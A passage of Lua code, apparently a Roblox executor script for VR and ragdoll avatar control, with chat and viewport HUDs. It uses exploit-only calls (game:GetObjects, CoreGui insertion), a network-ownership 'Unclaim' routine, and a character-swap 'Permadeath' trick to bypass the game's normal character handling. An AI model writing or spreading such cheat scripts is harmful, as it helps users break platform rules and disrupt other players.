	GetHeadAccessories()
	
elseif RagdollEnabled then
	if RagdollHeadMovement then
		Permadeath()
		MoveHead = CreateAlignment(Character["Head"])
	end
	
	MoveRightArm = CreateAlignment(Character["Right Arm"])
	MoveLeftArm = CreateAlignment(Character["Left Arm"])
	MoveRightLeg = CreateAlignment(Character["Right Leg"])
	MoveLeftLeg = CreateAlignment(Character["Left Leg"])
	MoveTorso = CreateAlignment(Character["Torso"])
	MoveRoot = CreateAlignment(Character.HumanoidRootPart)
	
	if RagdollHeadMovement then
		for _, Accessory in next, Character:GetChildren() do
			if Accessory:IsA("Accessory") and Accessory:FindFirstChild("Handle") then
				local Attachment1 = Accessory.Handle:FindFirstChildWhichIsA("Attachment")
				local Attachment0 = Character:FindFirstChild(tostring(Attachment1), true)
				
				local Orientation = Instance.new("AlignOrientation")
				local Position = Instance.new("AlignPosition")
				
				print(Attachment1, Attachment0, Accessory)
				
				Orientation.Attachment0 = Attachment1
				Orientation.Attachment1 = Attachment0
				Orientation.RigidityEnabled = false
				Orientation.ReactionTorqueEnabled = true
				Orientation.MaxTorque = 20000
				Orientation.Responsiveness = 40
				Orientation.Parent = Character.Head
				
				Position.Attachment0 = Attachment1
				Position.Attachment1 = Attachment0
				Position.RigidityEnabled = false
				Position.ReactionForceEnabled = true
				Position.MaxForce = 40000
				Position.Responsiveness = 40
				Position.Parent = Character.Head
			end
		end
	end
end

--[[
	Movement
--]]

VirtualRig.Name = "VirtualRig"
VirtualRig.RightFoot.BodyPosition.Position = CharacterCFrame.p
VirtualRig.LeftFoot.BodyPosition.Position = CharacterCFrame.p
VirtualRig.Parent = workspace
VirtualRig:SetPrimaryPartCFrame(CharacterCFrame)

VirtualRig.Humanoid.Health = 0
VirtualRig:BreakJoints()
--

VirtualBody.Parent = workspace
VirtualBody.Name = "VirtualBody"
VirtualBody.Humanoid.WalkSpeed = 8
VirtualBody.Humanoid.CameraOffset = Vector3.new(0, StudsOffset, 0)
VirtualBody:SetPrimaryPartCFrame(CharacterCFrame)

VirtualBody.Humanoid.Died:Connect(function()
	print("Virtual death")
	if AutoRespawn then
		Character:BreakJoints()
		
		if RagdollHeadMovement and RagdollEnabled then
			Network:Unclaim()
			Respawn()
		end
	end
end)
--

Camera.CameraSubject = VirtualBody.Humanoid

Character.Humanoid.WalkSpeed = 0
Character.Humanoid.JumpPower = 1

for _, Part in next, VirtualBody:GetChildren() do
	if Part:IsA("BasePart") then
		Part.Transparency = 1
	end
end

for _, Part in next, VirtualRig:GetChildren() do
	if Part:IsA("BasePart") then
		Part.Transparency = 1
	end
end

if not VRReady then
	VirtualRig.RightUpperArm.ShoulderConstraint.RigidityEnabled = true
	VirtualRig.LeftUpperArm.ShoulderConstraint.RigidityEnabled = true
end


local OnMoving = RunService.Stepped:Connect(function()
	local Direction = Character.Humanoid.MoveDirection
	local Start = VirtualBody.HumanoidRootPart.Position
	local Point = Start + Direction * 6
	
	VirtualBody.Humanoid:MoveTo(Point)
end)

Character.Humanoid.Jumping:Connect(function()
	VirtualBody.Humanoid.Jump = true
end)

UserInputService.JumpRequest:Connect(function()
	VirtualBody.Humanoid.Jump = true
end)

--[[
	VR Replication
--]]

if RagdollEnabled then
	for _, Part in pairs(Character:GetDescendants()) do
		if Part:IsA("BasePart") and Part.Name == "Handle" and Part.Parent:IsA("Accessory") then
			Part.LocalTransparencyModifier = 1
		elseif Part:IsA("BasePart") and Part.Transparency < 0.5 and Part.Name ~= "Head" then
			Part.LocalTransparencyModifier = 0.5
		elseif Part:IsA("BasePart") and Part.Name == "Head" then
			Part.LocalTransparencyModifier = 1
		end
		
		if not Part:IsA("BasePart") and not Part:IsA("AlignPosition") and not Part:IsA("AlignOrientation") then
			pcall(function()
				Part.Transparency = 1
			end)
			
			pcall(function()
				Part.Enabled = false
			end)
		end
	end
end

local FootUpdateDebounce = tick()

local function FloorRay(Part, Distance)
	local Position = Part.CFrame.p
	local Target = Position - Vector3.new(0, Distance, 0)
	local Line = Ray.new(Position, (Target - Position).Unit * Distance)
	
	local FloorPart, FloorPosition, FloorNormal = workspace:FindPartOnRayWithIgnoreList(Line, {VirtualRig, VirtualBody, Character})
	
	if FloorPart then
		return FloorPart, FloorPosition, FloorNormal, (FloorPosition - Position).Magnitude
	else
		return nil, Target, Vector3.new(), Distance
	end
end

local function Flatten(CF)
	local X,Y,Z = CF.X,CF.Y,CF.Z
	local LX,LZ = CF.lookVector.X,CF.lookVector.Z
	
	return CFrame.new(X,Y,Z) * CFrame.Angles(0,math.atan2(LX,LZ),0)
end

local FootTurn = 1

local function FootReady(Foot, Target)
	local MaxDist
	
	if Character.Humanoid.MoveDirection.Magnitude > 0 then
		MaxDist = .5
	else
		MaxDist = 1
	end
	
	local PastThreshold = (Foot.Position - Target.Position).Magnitude > MaxDist
	local PastTick = tick() - FootUpdateDebounce >= 2
	
	if PastThreshold or PastTick then
		FootUpdateDebounce = tick()
	end
	
	return
		PastThreshold
	or
		PastTick
end

local function FootYield()
	local RightFooting = VirtualRig.RightFoot.BodyPosition
	local LeftFooting = VirtualRig.LeftFoot.BodyPosition
	local LowerTorso = VirtualRig.LowerTorso
	
	local Yield = tick()
	
	repeat
		RunService.Stepped:Wait()
		if
			(LowerTorso.Position - RightFooting.Position).Y > 4
		or
			(LowerTorso.Position - LeftFooting.Position).Y > 4
		or
			((LowerTorso.Position - RightFooting.Position) * Vector3.new(1, 0, 1)).Magnitude > 4
		or
			((LowerTorso.Position - LeftFooting.Position) * Vector3.new(1, 0, 1)).Magnitude > 4
		then
			break
		end
	until tick() - Yield >= .17
end

local function UpdateFooting()
	if not VirtualRig:FindFirstChild("LowerTorso") then
		wait()
		return
	end
	
	local Floor, FloorPosition, FloorNormal, Dist = FloorRay(VirtualRig.LowerTorso, 3)
	
	Dist = math.clamp(Dist, 0, 5)
	
	local FootTarget = 
		VirtualRig.LowerTorso.CFrame *
		CFrame.new(FootPlacementSettings.RightOffset) -
		Vector3.new(0, Dist, 0) +
		Character.Humanoid.MoveDirection * (VirtualBody.Humanoid.WalkSpeed / 8) * 2
	
	if FootReady(VirtualRig.RightFoot, FootTarget) then
		VirtualRig.RightFoot.BodyPosition.Position = FootTarget.p
		VirtualRig.RightFoot.BodyGyro.CFrame = Flatten(VirtualRig.LowerTorso.CFrame)
	end
	
	FootYield()
	
	local FootTarget = 
		VirtualRig.LowerTorso.CFrame *
		CFrame.new(FootPlacementSettings.LeftOffset) -
		Vector3.new(0, Dist, 0) +
		Character.Humanoid.MoveDirection * (VirtualBody.Humanoid.WalkSpeed / 8) * 2
	
	if FootReady(VirtualRig.LeftFoot, FootTarget) then
		VirtualRig.LeftFoot.BodyPosition.Position = FootTarget.p
		VirtualRig.LeftFoot.BodyGyro.CFrame = Flatten(VirtualRig.LowerTorso.CFrame)
	end
end

local function UpdateTorsoPosition()
	if not RagdollEnabled then
		if TorsoHandle then
			local Positioning = VirtualRig.UpperTorso.CFrame
			
			if not TorsoGrip or not TorsoGrip.Parent then
				TorsoGrip = CreateRightGrip(TorsoHandle)
			end
			
			local Parent = TorsoGrip.Parent
			
			TorsoGrip.C1 = CFrame.new()
			TorsoGrip.C0 = TorsoGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(Positioning * CFrame.new(0, -0.25, 0) * AccessorySettings.LimbOffset), Smoothness)
			TorsoGrip.Parent = nil
			TorsoGrip.Parent = Parent
		end
	else
		local Positioning = VirtualRig.UpperTorso.CFrame
		
		MoveTorso(Positioning * CFrame.new(0, -0.25, 0))
		MoveRoot(Positioning * CFrame.new(0, -0.25, 0))
	end
end

local function UpdateLegPosition()
	if not RagdollEnabled then
		if RightHipHandle then
			local Positioning =
				VirtualRig.RightLowerLeg.CFrame
				: Lerp(VirtualRig.RightFoot.CFrame, 0.5)
				+ Vector3.new(0, 0.5, 0)
			
			if not RightHipHandle or not RightHipHandle.Parent then
				RightLegGrip = CreateRightGrip(RightHipHandle)
			end
			
			local Parent = RightLegGrip.Parent
			
			RightLegGrip.C1 = CFrame.new()
			RightLegGrip.C0 = RightLegGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(Positioning * AccessorySettings.LimbOffset), Smoothness)
			RightLegGrip.Parent = nil
			RightLegGrip.Parent = Parent
		end
		
		if LeftHipHandle then
			local Positioning =
				VirtualRig.LeftLowerLeg.CFrame
				: Lerp(VirtualRig.LeftFoot.CFrame, 0.5)
				+ Vector3.new(0, 0.5, 0)
			
			if not LeftLegGrip or not LeftLegGrip.Parent then
				LeftLegGrip = CreateRightGrip(LeftHipHandle)
			end
			
			local Parent = LeftLegGrip.Parent
			
			LeftLegGrip.C1 = CFrame.new()
			LeftLegGrip.C0 = LeftLegGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(Positioning * AccessorySettings.LimbOffset), Smoothness)
			LeftLegGrip.Parent = nil
			LeftLegGrip.Parent = Parent
		end
	else
		do
			local Positioning =
				VirtualRig.RightLowerLeg.CFrame
				: Lerp(VirtualRig.RightFoot.CFrame, 0.5)
				* CFrame.Angles(0, math.rad(180), 0)
				+ Vector3.new(0, 0.5, 0)
			
			MoveRightLeg(Positioning)
		end
		
		do
			local Positioning =
				VirtualRig.LeftLowerLeg.CFrame
				: Lerp(VirtualRig.LeftFoot.CFrame, 0.5)
				* CFrame.Angles(0, math.rad(180), 0)
				+ Vector3.new(0, 0.5, 0)
			
			MoveLeftLeg(Positioning)
		end
	end
end

warn("VRReady is", VRReady)

local function OnUserCFrameChanged(UserCFrame, Positioning, IgnoreTorso)
	local Positioning = Camera.CFrame * Positioning
	
	if not IgnoreTorso then
		UpdateTorsoPosition()
		UpdateLegPosition()
	end
	
	if not RagdollEnabled then
		if UserCFrame == Enum.UserCFrame.Head and AccessorySettings.Head then
			for _, Table in next, HeadAccessories do
				local Handle, RightGrip, HatAtt, HeadAtt, BasePart = unpack(Table)
				local LocalPositioning = Positioning
				
				if not RightGrip or not RightGrip.Parent then
					RightGrip = CreateRightGrip(Handle)
					Table[2] = RightGrip
				end
				
				local Parent = RightGrip.Parent
				
				if BasePart then
					LocalPositioning = BasePart.CFrame * HeadAtt
				end
				
				RightGrip.C1 = HatAtt
				RightGrip.C0 = RightGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(LocalPositioning), Smoothness)
				RightGrip.Parent = nil
				RightGrip.Parent = Parent
			end
			
		elseif RightHandle and UserCFrame == Enum.UserCFrame.RightHand and AccessorySettings.RightArm then
			local HandPosition = Positioning
			local LocalPositioning = Positioning
			
			if not RightHandGrip or not RightHandGrip.Parent then
				RightHandGrip = CreateRightGrip(RightHandle)
			end
			
			if AccurateHandPosition then
				HandPosition = HandPosition * CFrame.new(0, 0, 1)
			end
			
			if not VRReady then
				local HeadRotation = Camera.CFrame - Camera.CFrame.p
				
				HandPosition = VirtualRig.RightUpperArm.CFrame:Lerp(VirtualRig.RightLowerArm.CFrame, 0.5) * AccessorySettings.LimbOffset
				
				--LocalPositioning = (HeadRotation + (HandPosition * CFrame.new(0, 0, 1)).p) * CFrame.Angles(math.rad(-45), 0, 0)
				LocalPositioning = HandPosition * CFrame.new(0, 0, 1) * CFrame.Angles(math.rad(-180), 0, 0)
				
				if Point2 then
					VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
					VirtualRig.RightUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
				elseif VirtualRig.RightUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
					VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
				end
			elseif AccurateHandPosition then
				LocalPositioning = HandPosition
			end
			
			local Parent = RightHandGrip.Parent
			
			RightHandGrip.C1 = CFrame.new()
			RightHandGrip.C0 = RightHandGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(HandPosition), Smoothness)
			RightHandGrip.Parent = nil
			RightHandGrip.Parent = Parent
			
			--
			
			local EquippedTool = GetExtraTool()
			
			if EquippedTool and EquippedTool:FindFirstChild("Handle") then
				local EquippedGrip = GetGripForHandle(EquippedTool.Handle)
				local Parent = EquippedGrip.Parent
				
				local ArmBaseCFrame = ArmBase.CFrame
				if ArmBase.Name == "Right Arm" then
					ArmBaseCFrame = ArmBaseCFrame
				end
				
				EquippedGrip.C1 = EquippedTool.Grip
				EquippedGrip.C0 = EquippedGrip.C0:Lerp(ArmBaseCFrame:ToObjectSpace(LocalPositioning), Smoothness)
				EquippedGrip.Parent = nil
				EquippedGrip.Parent = Parent
			end
			
		elseif LeftHandle and UserCFrame == Enum.UserCFrame.LeftHand and AccessorySettings.LeftArm then
			local HandPosition = Positioning
			
			if not LeftHandGrip or not LeftHandGrip.Parent then
				LeftHandGrip = CreateRightGrip(LeftHandle)
			end
			
			if AccurateHandPosition then
				HandPosition = HandPosition * CFrame.new(0, 0, 1)
			end
			
			if not VRReady then
				HandPosition = VirtualRig.LeftUpperArm.CFrame:Lerp(VirtualRig.LeftLowerArm.CFrame, 0.5) * AccessorySettings.LimbOffset
				--warn("Setting HandPosition to hands")
				if Point1 then
					VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
					VirtualRig.LeftUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
				elseif VirtualRig.LeftUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
					VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
				end
			end
			
			local Parent = LeftHandGrip.Parent
			
			LeftHandGrip.C1 = CFrame.new()
			LeftHandGrip.C0 = LeftHandGrip.C0:Lerp(WeldBase.CFrame:ToObjectSpace(HandPosition), Smoothness)
			LeftHandGrip.Parent = nil
			LeftHandGrip.Parent = Parent
			
		end
	end
	
	if RagdollEnabled then
		if UserCFrame == Enum.UserCFrame.Head and RagdollHeadMovement then
			MoveHead(Positioning)
		elseif UserCFrame == Enum.UserCFrame.RightHand then
			local Positioning = Positioning
			
			if not VRReady then
				Positioning = VirtualRig.RightUpperArm.CFrame:Lerp(VirtualRig.RightLowerArm.CFrame, 0.5)
			elseif AccurateHandPosition then
				Positioning = Positioning * CFrame.new(0, 0, 1)
			end
			
			if VRReady then
				Positioning = Positioning * AccessorySettings.LimbOffset
			end
			
			MoveRightArm(Positioning)
			
			if Point2 then
				VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
				VirtualRig.RightUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
			elseif VirtualRig.RightUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
				VirtualRig.RightUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
			end
		elseif UserCFrame == Enum.UserCFrame.LeftHand then
			local Positioning = Positioning
			
			if not VRReady then
				Positioning = VirtualRig.LeftUpperArm.CFrame:Lerp(VirtualRig.LeftLowerArm.CFrame, 0.5)
			elseif AccurateHandPosition then
				Positioning = Positioning * CFrame.new(0, 0, 1)
			end
			
			if VRReady then
				Positioning = Positioning * AccessorySettings.LimbOffset
			end
			
			MoveLeftArm(Positioning)
			
			if Point1 then
				VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
				VirtualRig.LeftUpperArm.Aim.CFrame = Camera.CFrame * AccessorySettings.LimbOffset
			elseif VirtualRig.LeftUpperArm.Aim.MaxTorque ~= Vector3.new(0, 0, 0) then
				VirtualRig.LeftUpperArm.Aim.MaxTorque = Vector3.new(0, 0, 0)
			end
		end
	end
	
	if UserCFrame == Enum.UserCFrame.Head then
		VirtualRig.Head.CFrame = Positioning
		
	elseif UserCFrame == Enum.UserCFrame.RightHand and VRReady then
		VirtualRig.RightHand.CFrame = Positioning
		
	elseif UserCFrame == Enum.UserCFrame.LeftHand and VRReady then
		VirtualRig.LeftHand.CFrame = Positioning
		
	end
	
	if not VRReady and VirtualRig.LeftHand.Anchored then
		VirtualRig.RightHand.Anchored = false
		VirtualRig.LeftHand.Anchored = false
	elseif VRReady and not VirtualRig.LeftHand.Anchored then
		VirtualRig.RightHand.Anchored = true
		VirtualRig.LeftHand.Anchored = true
	end
end

local CFrameChanged = VRService.UserCFrameChanged:Connect(OnUserCFrameChanged)

local OnStepped = RunService.Stepped:Connect(function()
	for _, Part in pairs(VirtualRig:GetChildren()) do
		if Part:IsA("BasePart") then
			Part.CanCollide = false
		end
	end
	
	if RagdollEnabled then
		for _, Part in pairs(Character:GetChildren()) do
			if Part:IsA("BasePart") then
				Part.CanCollide = false
			end
		end
	end
	
	if NoCollision then
		for _, Player in pairs(Players:GetPlayers()) do
			if Player ~= Client and Player.Character then
				local Descendants = Player.Character:GetDescendants()
				for i = 1, #Descendants do
					local Part = Descendants[i]
					if Part:IsA("BasePart") then
						Part.CanCollide = false
						Part.Velocity = Vector3.new()
						Part.RotVelocity = Vector3.new()
					end
				end
			end
		end
	end
end)

local OnRenderStepped = RunService.Stepped:Connect(function()
	Camera.CameraSubject = VirtualBody.Humanoid
	
	if RagdollEnabled then
		Character.HumanoidRootPart.CFrame = VirtualRig.UpperTorso.CFrame
		Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
	end
	
	if not VRReady then
		OnUserCFrameChanged(Enum.UserCFrame.Head, CFrame.new(0, 0, 0))
		
		OnUserCFrameChanged(Enum.UserCFrame.RightHand, CFrame.new(0, 0, 0), true)
		OnUserCFrameChanged(Enum.UserCFrame.LeftHand, CFrame.new(0, 0, 0), true)
	end
end)

spawn(function()
	while Character and Character.Parent do
		FootYield()
		UpdateFooting()
	end
end)

--[[
	Non-VR Support + VR Mechanics
--]]

local OnInput = UserInputService.InputBegan:Connect(function(Input, Processed)
	if not Processed then
		if Input.KeyCode == Enum.KeyCode.LeftControl or Input.KeyCode == Enum.KeyCode.ButtonL2 then
			Tween(VirtualBody.Humanoid, "Elastic", "Out", 1, {
				CameraOffset = Vector3.new(0, StudsOffset - 1.5, 0)
			})
		end
	
		if Input.KeyCode == Enum.KeyCode.X then
			if RagdollEnabled and RagdollHeadMovement then
				Network:Unclaim()
				Respawn()
			end
		end
		
		if Input.KeyCode == Enum.KeyCode.C then
			VirtualBody:MoveTo(Mouse.Hit.p)
			VirtualRig:MoveTo(Mouse.Hit.p)
		end
	end
		
	if Input.KeyCode == Enum.KeyCode.LeftShift or Input.KeyCode == Enum.KeyCode.ButtonR2 then
		Tween(VirtualBody.Humanoid, "Sine", "Out", 1, {
			WalkSpeed = 16
		})
	end
	
	if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton1 then
		Point1 = true
	end
	
	if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton2 then
		Point2 = true
	end
	
	if VRReady and Input.KeyCode == Enum.KeyCode.ButtonY then
		Character:BreakJoints()
		
		if RagdollEnabled and RagdollHeadMovement then
			Network:Unclaim()
			Respawn()
		end
	end
end)

local OnInputEnded = UserInputService.InputEnded:Connect(function(Input, Processed)
	if not Processed then
		if Input.KeyCode == Enum.KeyCode.LeftControl or Input.KeyCode == Enum.KeyCode.ButtonL2 then
			Tween(VirtualBody.Humanoid, "Elastic", "Out", 1, {
				CameraOffset = Vector3.new(0, StudsOffset, 0)
			})
		end
	end
		
	if Input.KeyCode == Enum.KeyCode.LeftShift or Input.KeyCode == Enum.KeyCode.ButtonR2 then
		Tween(VirtualBody.Humanoid, "Sine", "Out", 1, {
			WalkSpeed = 8
		})
	end
	
	if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton1 then
		Point1 = false
	end
	
	if not VRReady and Input.UserInputType == Enum.UserInputType.MouseButton2 then
		Point2 = false
	end
end)

--[[
	Proper Cleanup
--]]

local OnReset

OnReset = Client.CharacterAdded:Connect(function()
	OnReset:Disconnect();
	CFrameChanged:Disconnect();
	OnStepped:Disconnect();
	OnRenderStepped:Disconnect();
	OnMoving:Disconnect();
	OnInput:Disconnect();
	OnInputEnded:Disconnect();
	
	VirtualRig:Destroy();
	VirtualBody:Destroy();
	
	if RagdollEnabled then
		Network:Unclaim();
	end
	
	if AutoRun then
		delay(2, function()
			Script()
		end)
	end
end)

if ChatEnabled then
	spawn(ChatHUDFunc)
end

if ViewportEnabled then
	spawn(ViewHUDFunc)
end

do
	--[[
		Functions
	--]]
	
	local Players = game:GetService("Players")
	 local Client = Players.LocalPlayer
	
	local VRService = game:GetService("VRService")
	 local VRReady = VRService.VREnabled
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	local Camera = workspace.CurrentCamera
	
	--[[
		Code
	--]]
	
	if VRReady then
		local Pointer = game:GetObjects("rbxassetid://4476173280")[1]
		
		Pointer.Parent = workspace
		Pointer.Beam.Enabled = false
		Pointer.Target.ParticleEmitter.Enabled = false
		
		local RenderStepped = RunService.RenderStepped:Connect(function()
			if Pointer.Beam.Enabled then
				local RightHand = Camera.CFrame * VRService:GetUserCFrame(Enum.UserCFrame.RightHand)
				local Target = RightHand * CFrame.new(0, 0, -10)
				
				local Line = Ray.new(RightHand.p, (Target.p - RightHand.p).Unit * 128)
				local Part, Position = workspace:FindPartOnRayWithIgnoreList(Line, {VirtualRig, VirtualBody, Character, Pointer})
				
				local Distance = (Position - RightHand.p).Magnitude
				
				Pointer.Target.Position = Vector3.new(0, 0, -Distance)
				Pointer.CFrame = RightHand
			end
		end)
		
		local Input = UserInputService.InputBegan:Connect(function(Input)
			if Input.KeyCode == Enum.KeyCode.ButtonB then
				Pointer.Beam.Enabled = not Pointer.Beam.Enabled
				Pointer.Target.ParticleEmitter.Enabled = not Pointer.Target.ParticleEmitter.Enabled
			end
		end)
		
		--
		
		local CharacterAdded
		
		CharacterAdded = Client.CharacterAdded:Connect(function()
			RenderStepped:Disconnect()
			Input:Disconnect()
			CharacterAdded:Disconnect()
			
			Pointer:Destroy()
			Pointer = nil
		end)
	else
		return
	end
end

end;

Permadeath = function()
	local ch = game.Players.LocalPlayer.Character
	local prt=Instance.new("Model", workspace)
	local z1 =  Instance.new("Part", prt)
	z1.Name="Torso"
	z1.CanCollide = false
	z1.Anchored = true
	local z2  =Instance.new("Part", prt)
	z2.Name="Head"
	z2.Anchored = true
	z2.CanCollide = false
	local z3 =Instance.new("Humanoid", prt)
	z3.Name="Humanoid"
	z1.Position = Vector3.new(0,9999,0)
	z2.Position = Vector3.new(0,9991,0)
	game.Players.LocalPlayer.Character=prt
	wait(5)
	warn("50%")
	game.Players.LocalPlayer.Character=ch
	wait(6)
	warn("100%")
end;

Respawn = function()
	local ch = game.Players.LocalPlayer.Character
	
	local prt=Instance.new("Model", workspace)
	local z1 =  Instance.new("Part", prt)
	z1.Name="Torso"
	z1.CanCollide = false
	z1.Anchored = true
	local z2  =Instance.new("Part", prt)
	z2.Name="Head"
	z2.Anchored = true
	z2.CanCollide = false
	local z3 =Instance.new("Humanoid", prt)
	z3.Name="Humanoid"
	z1.Position = Vector3.new(0,9999,0)
	z2.Position = Vector3.new(0,9991,0)
	game.Players.LocalPlayer.Character=prt
	wait(5)
	game.Players.LocalPlayer.Character=ch
end;

ChatHUDFunc = function()
	--[[
		Variables
	--]]
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	local VRService = game:GetService("VRService")
	 local VRReady = VRService.VREnabled
	
	local Players = game:GetService("Players")
	 local Client = Players.LocalPlayer
	
	local ChatHUD = game:GetObjects("rbxassetid://4476067885")[1]
	 local GlobalFrame = ChatHUD.GlobalFrame
	  local Template = GlobalFrame.Template
	 local LocalFrame = ChatHUD.LocalFrame
	 local Global = ChatHUD.Global
	 local Local = ChatHUD.Local
	
	local Camera = workspace.CurrentCamera
	
	Template.Parent = nil
	ChatHUD.Parent = game:GetService("CoreGui")
	
	--[[
		Code
	--]]
	
	local Highlight = Global.Frame.BackgroundColor3
	local Deselected = Local.Frame.BackgroundColor3
	
	local OpenGlobalTab = function()
		Global.Frame.BackgroundColor3 = Highlight
		Local.Frame.BackgroundColor3 = Deselected
		
		Global.Font = Enum.Font.SourceSansBold
		Local.Font = Enum.Font.SourceSans
		
		GlobalFrame.Visible = true
		LocalFrame.Visible = false
	end
	
	local OpenLocalTab = function()
		Global.Frame.BackgroundColor3 = Deselected
		Local.Frame.BackgroundColor3 = Highlight
		
		Global.Font = Enum.Font.SourceSans
		Local.Font = Enum.Font.SourceSansBold
		
		GlobalFrame.Visible = false
		LocalFrame.Visible = true
	end
	
	Global.MouseButton1Down:Connect(OpenGlobalTab)
	Local.MouseButton1Down:Connect(OpenLocalTab)
	Global.MouseButton1Click:Connect(OpenGlobalTab)
	Local.MouseButton1Click:Connect(OpenLocalTab)
	
	OpenLocalTab()
	
	--
	
	local function GetPlayerDistance(Sender)
		if Sender.Character and Sender.Character:FindFirstChild("Head") then
			return math.floor((Sender.Character.Head.Position - Camera:GetRenderCFrame().p).Magnitude + 0.5)
		end
	end
	
	local function NewGlobal(Message, Sender, Color)
		local Frame = Template:Clone()
		
		Frame.Text = ("[%s]: %s"):format(Sender.Name, Message)
		Frame.User.Text = ("[%s]:"):format(Sender.Name)
		Frame.User.TextColor3 = Color
		Frame.BackgroundColor3 = Color
		Frame.Parent = GlobalFrame
		
		delay(60, function()
			Frame:Destroy()
		end)
	end
	
	local function NewLocal(Message, Sender, Color, Dist)
		local Frame = Template:Clone()
		
		Frame.Text = ("(%s) [%s]: %s"):format(tostring(Dist), Sender.Name, Message)
		Frame.User.Text = ("(%s) [%s]:"):format(tostring(Dist), Sender.Name)
		Frame.User.TextColor3 = Color
		Frame.BackgroundColor3 = Color
		Frame.Parent = LocalFrame
		
		delay(60, function()
			Frame:Destroy()
		end)
	end
	
	local function OnNewChat(Message, Sender, Color)
		if not ChatHUD or not ChatHUD.Parent then return end
		
		NewGlobal(Message, Sender, Color)
		
		local Distance = GetPlayerDistance(Sender)
		
		if Distance and Distance <= ChatLocalRange then
			NewLocal(Message, Sender, Color, Distance)
		end
	end
	
	local function OnPlayerAdded(Player)
		if not ChatHUD or not ChatHUD.Parent then return end
		
		local Color = BrickColor.Random().Color
		
		Player.Chatted:Connect(function(Message)
			OnNewChat(Message, Player, Color)
		end)
	end
	
	Players.PlayerAdded:Connect(OnPlayerAdded)
	
	for _, Player in pairs(Players:GetPlayers()) do
		OnPlayerAdded(Player)
	end
	
	--
	
	local ChatPart = ChatHUD.Part
	
	ChatHUD.Adornee = ChatPart
	
	if VRReady then
		ChatHUD.Parent = game:GetService("CoreGui")
		ChatHUD.Enabled = true
		ChatHUD.AlwaysOnTop = true
		
		local OnInput = UserInputService.InputBegan:Connect(function(Input, Processed)
			if not Processed then
				if Input.KeyCode == Enum.KeyCode.ButtonX then
					ChatHUD.Enabled = not ChatHUD.Enabled
				end
			end
		end)
		
		local RenderStepped = RunService.RenderStepped:Connect(function()
			local LeftHand = VRService:GetUserCFrame(Enum.UserCFrame.LeftHand)
			
			ChatPart.CFrame = Camera.CFrame * LeftHand
		end)
		
		local CharacterAdded
		
		CharacterAdded = Client.CharacterAdded:Connect(function()
			OnInput:Disconnect()
			RenderStepped:Disconnect()
			CharacterAdded:Disconnect()
			
			ChatHUD:Destroy()
			ChatHUD = nil
		end)
	end
	
	wait(9e9)
end;

ViewHUDFunc = function()
	--[[
		Variables
	--]]
	
	local ViewportRange = ViewportRange or 32
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	local VRService = game:GetService("VRService")
	 local VRReady = VRService.VREnabled
	
	local Players = game:GetService("Players")
	 local Client = Players.LocalPlayer
	  local Mouse = Client:GetMouse()
	
	local Camera = workspace.CurrentCamera
	 local CameraPort = Camera.CFrame
	
	local ViewHUD = script:FindFirstChild("ViewHUD") or game:GetObjects("rbxassetid://4480405425")[1]
	 local Viewport = ViewHUD.Viewport
	  local Viewcam = Instance.new("Camera")
	 local ViewPart = ViewHUD.Part
	
	ViewHUD.Parent = game:GetService("CoreGui")
	
	Viewcam.Parent = Viewport
	Viewcam.CameraType = Enum.CameraType.Scriptable
	Viewport.CurrentCamera = Viewcam
	Viewport.BackgroundTransparency = 1
	
	--[[
		Code
	--]]
	
	local function Clone(Character)
		local Arc = Character.Archivable
		local Clone;
		
		Character.Archivable = true
		Clone = Character:Clone()
		Character.Archivable = Arc
		
		return Clone
	end
	
	local function GetPart(Name, Parent, Descendants)
		for i = 1, #Descendants do
			local Part = Descendants[i]
			
			if Part.Name == Name and Part.Parent.Name == Parent then
				return Part
			end
		end
	end
	
	local function OnPlayerAdded(Player)
		if not ViewHUD or not ViewHUD.Parent then return end
		
		local function CharacterAdded(Character)
			if not ViewHUD or not ViewHUD.Parent then return end
			
			Character:WaitForChild("Head")
			Character:WaitForChild("Humanoid")
			
			wait(3)
			
			local FakeChar = Clone(Character)
			local Root = FakeChar:FindFirstChild("HumanoidRootPart") or FakeChar:FindFirstChild("Head")
			local RenderConnection;
			
			local Descendants = FakeChar:GetDescendants()
			local RealDescendants = Character:GetDescendants()
			local Correspondents = {};
			
			FakeChar.Humanoid.DisplayDistanceType = "None"
			
			for i = 1, #Descendants do
				local Part = Descendants[i]
				local Real = Part:IsA("BasePart") and GetPart(Part.Name, Part.Parent.Name, RealDescendants)
				
				if Part:IsA("BasePart") and Real then
					Part.Anchored = true
					Part:BreakJoints()
					
					if Part.Parent:IsA("Accessory") then
						Part.Transparency = 0
					end
					
					table.insert(Correspondents, {Part, Real})
				end
			end
			
			RenderConnection = RunService.RenderStepped:Connect(function()
				if not Character or not Character.Parent then
					RenderConnection:Disconnect()
					FakeChar:Destroy()
					
					return
				end
				
				if (Root and (Root.Position - Camera.CFrame.p).Magnitude <= ViewportRange) or Player == Client or not Root then
					for i = 1, #Correspondents do
						local Part, Real = unpack(Correspondents[i])
						
